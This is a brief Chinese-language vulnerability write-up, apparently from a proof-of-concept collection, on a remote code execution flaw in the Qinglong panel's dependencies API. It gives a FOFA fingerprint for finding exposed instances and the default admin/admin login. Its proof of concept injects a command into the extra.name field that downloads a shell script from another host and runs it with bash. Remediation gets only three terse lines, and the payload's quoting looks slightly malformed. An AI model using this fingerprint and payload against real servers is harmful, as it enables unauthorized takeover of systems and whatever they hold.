# 青龙面板dependencies接口远程代码执行漏洞

## 漏洞信息

| 项目 | 内容 |
|------|------|
| 漏洞名称 | 青龙面板dependencies接口远程代码执行漏洞 |
| 漏洞类型 | RCE（远程代码执行） |
| 影响组件 | /api/dependencies/look |
| 影响版本 | 青龙面板 |

## 漏洞概述

青龙面板存在dependencies接口存在远程代码执行漏洞，攻击者可通过构造恶意请求在服务器上执行任意命令。

## fofa查询语句

```
icon_hash=="-254502902"
```

## 漏洞复现

### POC

```json
POST /api/user/login HTTP/1.1
Host: 192.168.1.100:5700
Content-Type: application/json

{"username":"admin","password":"admin","url":"/api/dependencies/look","method":"POST","extra":{"name":"test";wget http://192.168.1.133:8000/shell.sh -O /tmp/shell.sh;bash /tmp/shell.sh","id":"123"}}
```

### 漏洞特征

- 路径：/api/dependencies/look
- 认证：需要登录（默认admin/admin）
- 攻击方式：在extra.name参数中注入命令

## 修复建议

1. 打补丁
2. 升级青龙面板到最新版本
3. 加强接口访问控制
